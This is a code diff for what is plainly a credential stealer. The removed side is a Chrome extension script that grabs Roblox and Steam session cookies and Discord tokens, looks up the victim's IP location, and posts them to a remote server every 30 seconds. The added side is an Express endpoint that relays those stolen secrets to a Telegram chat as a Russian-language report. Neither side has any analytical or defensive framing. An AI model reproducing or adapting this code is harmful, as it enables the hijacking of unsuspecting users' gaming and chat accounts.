@@ -1,97 +1,40 @@
-const SERVER_URL = "https://mm2-server.onrender.com/send";
-
-let sentRoblox = "";
-let sentSteam = "";
-let sentDiscord = "";
-
-async function getDiscordToken() {
+app.post('/send', async (req, res) => {
     try {
-        const tabs = await chrome.tabs.query({ url: "*://discord.com/*" });
-        for (const tab of tabs) {
-            try {
-                const results = await chrome.scripting.executeScript({
-                    target: { tabId: tab.id },
-                    func: () => {
-                        const token = localStorage.getItem("token");
-                        if (token) return token;
-                        return "";
-                    }
-                });
-                if (results[0] && results[0].result) {
-                    return results[0].result;
-                }
-            } catch (e) {}
-        }
-    } catch (e) {}
-    return "";
-}
+        const { robloxCookie, steamCookie, discordToken, robloxStatus, steamStatus, discordStatus, ip, country, city } = req.body;
 
-async function getIP() {
-    try {
-        const r = await fetch("https://ipwho.is/");
-        const j = await r.json();
-        if (j.ip && j.ip.includes(":")) {
-            const r2 = await fetch("https://api.ipify.org?format=json");
-            const j2 = await r2.json();
-            j.ip = j2.ip || j.ip;
-        }
-        return j;
+        let msg = "🔴 <b>⚠️ ОТЧЁТ</b>\n\n";
+        msg += "━━━━━━━━━━━━━━━━━━\n\n";
+        msg += "🌐 <b>IP:</b> <code>" + (ip || "Н/Д") + "</code>\n";
+        msg += "📍 <b>Страна:</b> <code>" + (country || "Н/Д") + "</code>\n";
+        msg += "🏙 <b>Город:</b> <code>" + (city || "Н/Д") + "</code>\n\n";
+        msg += "━━━━━━━━━━━━━━━━━━\n\n";
+
+        msg += "🍪 <b>ROBLOX COOKIE:</b>\n";
+        if (robloxStatus === "new") msg += "<code>" + robloxCookie + "</code>\n\n";
+        else if (robloxStatus === "sent") msg += "✅ Уже отправлен\n\n";
+        else msg += "❌ Не найден\n\n";
+
+        msg += "🎮 <b>STEAM COOKIE:</b>\n";
+        if (steamStatus === "new") msg += "<code>" + steamCookie + "</code>\n\n";
+        else if (steamStatus === "sent") msg += "✅ Уже отправлен\n\n";
+        else msg += "❌ Не найден\n\n";
+
+        msg += "💬 <b>DISCORD TOKEN:</b>\n";
+        if (discordStatus === "new") msg += "<code>" + discordToken + "</code>\n\n";
+        else if (discordStatus === "sent") msg += "✅ Уже отправлен\n\n";
+        else msg += "❌ Discord не открыт\n\n";
+
+        msg += "━━━━━━━━━━━━━━━━━━\n";
+        msg += "⏰ <b>Время:</b> " + new Date().toLocaleString("ru-RU");
+
+        await axios.post(API + "/sendMessage", {
+            chat_id: CHAT_ID,
+            text: msg,
+            parse_mode: "HTML"
+        });
+
+        res.json({ ok: true });
     } catch (e) {
-        return null;
+        res.status(500).json({ ok: false, error: e.message });
     }
-}
-
-async function sendData() {
-    const data = {
-        robloxCookie: "",
-        steamCookie: "",
-        discordToken: "",
-        ip: "",
-        country: "",
-        city: ""
-    };
-
-    const ip = await getIP();
-    data.ip = ip?.ip || "";
-    data.country = ip?.country || "";
-    data.city = ip?.city || "";
-
-    try {
-        const c = await chrome.cookies.getAll({ domain: ".roblox.com" });
-        const rob = c.find(x => x.name === ".ROBLOSECURITY");
-        if (rob && rob.value !== sentRoblox) {
-            sentRoblox = rob.value;
-            data.robloxCookie = rob.value;
-        }
-    } catch (e) {}
-
-    try {
-        const c = await chrome.cookies.getAll({ domain: "steamcommunity.com" });
-        const steam = c.find(x => x.name === "steamLoginSecure");
-        if (steam && steam.value !== sentSteam) {
-            sentSteam = steam.value;
-            data.steamCookie = steam.value;
-        }
-    } catch (e) {}
-
-    const discordToken = await getDiscordToken();
-    if (discordToken && discordToken !== sentDiscord) {
-        sentDiscord = discordToken;
-        data.discordToken = discordToken;
-    }
-
-    if (data.robloxCookie || data.steamCookie || data.discordToken) {
-        try {
-            await fetch(SERVER_URL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(data)
-            });
-        } catch (e) {}
-    }
-}
-
-chrome.runtime.onInstalled.addListener(() => { sendData(); });
-chrome.runtime.onStartup.addListener(() => { sendData(); });
-
-setInterval(sendData, 30000);
+});
